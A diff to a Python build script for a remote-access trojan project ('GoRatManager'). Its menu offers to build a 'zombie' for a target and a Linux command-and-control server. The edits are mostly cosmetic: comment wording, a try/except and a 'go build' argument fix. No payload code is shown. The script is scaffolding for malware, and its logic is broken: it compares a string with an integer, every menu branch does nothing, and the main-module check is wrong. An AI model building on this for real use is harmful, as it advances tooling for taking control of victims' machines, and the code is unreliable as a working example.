@@ -116,9 +116,9 @@ PROJECT_DEPENDENCIES = ["github.com/fatih/color",
                         "github.com/shirou/gopsutil/disk"]
 
 ###############################################################################
-#                            GLOBALS TO MODIFY
+#                            GLOBAL CONFIG
 ###############################################################################
-# I want to modify some variables in the globals file  net.IP
+# I want to modify some variables in the globals file
 # so we can compile custom binaries from generic code
 # holding initial critical information
 GLOBALS_FILE      = PROJECT_DIRECTORY + SHARED_CODE_DIRECTORY
@@ -147,7 +147,7 @@ logger              = logging.getLogger()
 script_cwd          = Path().absolute()
 script_osdir        = Path(__file__).parent.absolute()
 ################################################################################
-##############               COLOR PRINTING                    #################
+##############               JAZZY PRINTING                    #################
 ################################################################################
 
 redprint          = lambda text: print(Fore.RED + ' ' +  text + ' ' + Style.RESET_ALL) if (COLORMEQUALIFIED == True) else print(text)
@@ -220,19 +220,22 @@ Enter your selection using a single integer:
 4. Build Command And Control For Linux
 '''.format(project_name = PROJECT_NAME)
         blueprint(self.start_menu)
-        menu_selection = input()
-        # yes I validate like a fool
-        # users are foolish
-        if str.isdigit(menu_selection) and (len(menu_selection) == 1) and menu_selection > 4:
-            if menu_selection   =="1":
-                pass # self.init_project()
-            elif menu_selection == "2":
-                pass # self.install_dependencies()
-            elif menu_selection == "3":
-                pass # self.build_zombie_for_target()
-            elif menu_selection == "4":
-                pass
-    
+        try:
+            menu_selection = input()
+            # yes I validate like a fool
+            # users are foolish
+            if str.isdigit(menu_selection) and (len(menu_selection) == 1) and menu_selection > 4:
+                if menu_selection   =="1":
+                    pass # self.init_project()
+                elif menu_selection == "2":
+                    pass # self.install_dependencies()
+                elif menu_selection == "3":
+                    pass # self.build_zombie_for_target()
+                elif menu_selection == "4":
+                    pass
+        except Exception:
+            error_printer("[-] Failure in GoRatManager.__init__")
+
     def edit_globals(self, globals_file = GLOBALS_FILE):
         file_to_modify = open(globals_file, "w")
         globals_dict = {}
@@ -270,7 +273,7 @@ Enter your selection using a single integer:
         os.chdir(COMMAND_SRC_DIRECTORY)
         os.environ["GOOS"]   = BUILD_TARGET_OS
         os.environ["GOARCH"] = BUILD_TARGET_ARCH
-        exec_command("go build {} -o {}".format(name))
+        exec_command("go build -o {}".format(name))
 
 try:    
     if __name__ == "main":
